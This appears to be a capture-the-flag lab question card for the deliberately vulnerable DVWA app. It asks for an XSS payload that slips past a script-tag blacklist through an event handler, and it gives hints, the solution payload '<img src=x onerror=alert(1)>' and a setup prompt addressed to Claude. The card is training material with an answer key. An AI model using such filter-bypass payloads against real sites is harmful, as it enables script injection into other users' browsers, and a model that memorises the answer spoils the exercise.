# Q088 — DVWA CSP Concept

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🔴 Hard |
| **Tools** | `browser` |
| **Time budget** | 15–25 min |

---

## 📝 Question

DVWA high security XSS uses content filters. Provide a payload that bypasses simple `<script>` blacklist using event handler.

---

## 🎯 Flag Format

```
payload=<text>
```

Example: `payload=<img src=x onerror=alert(1)>`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`onerror`, `onload`, `onclick` handlers bypass simple script-tag filter.
</details>

<details>
<summary>Hint 2</summary>

SVG also useful.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
<img src=x onerror=alert(1)>
```

Triggers alert without literal <script>.

**Answer:** `payload=<img src=x onerror=alert(1)>`

📖 Ref: [playbooks/webapp-playbook.md](../../playbooks/webapp-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q088:
1. DVWA up; security can be any — payload is crafted client-side.
2. Firefox on Parrot to render the XSS.

Report back: "Lab ready for Q088 — DVWA XSS reflected/stored page reachable".
```
